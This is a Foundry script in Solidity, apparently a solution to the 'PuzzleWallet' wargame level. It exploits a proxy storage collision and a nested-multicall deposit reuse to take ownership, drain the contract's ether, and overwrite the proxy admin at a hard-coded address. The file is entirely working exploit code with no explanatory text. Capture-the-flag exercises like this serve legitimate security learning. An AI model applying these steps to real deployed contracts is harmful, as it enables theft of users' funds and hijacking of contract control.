/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function balanceOf(address user) external view returns (uint256);

    function maxBalance() external view returns (uint256);

    function owner() external view returns (address);

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWallet is Script {
    function run() public {
        vm.startBroadcast();

        IPuzzleProxy puzzleProxy = IPuzzleProxy(
            0xca94b7deE7EFA067B37C947A976A97fB2ae9C951
        );
        puzzleProxy.proposeNewAdmin(msg.sender);

        IPuzzleWallet puzzleWallet = IPuzzleWallet(
            0xca94b7deE7EFA067B37C947A976A97fB2ae9C951
        );

        puzzleWallet.addToWhitelist(msg.sender);

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("multicall(bytes[])", depositData);
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositData);

        puzzleWallet.multicall{value: 1000000000000000}(data);

        puzzleWallet.execute(msg.sender, 2000000000000000, "");

        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
